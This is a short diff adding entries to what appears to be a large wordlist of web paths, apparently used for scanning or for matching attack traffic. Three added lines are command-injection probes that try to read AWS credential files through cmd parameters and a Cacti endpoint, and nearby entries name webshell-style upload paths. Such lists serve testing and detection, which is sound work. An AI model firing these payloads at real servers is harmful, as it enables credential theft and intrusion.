@@ -16860,3 +16860,7 @@ http://www.chinaso.com/?0.145715933928683196010916160
 /assets/bypass.php
 /new/transjule.php
 /wp-content/upgrade/upfile.php
+/app?cmd=cat+~/.aws/credentials
+/cacti/cmd_realtime.php?1+1&&cat+~/.aws/credentials+1+1+1
+/api/v1/execute?cmd=cat+/root/.aws/credentials
+/src/getSettings.rsb?@json
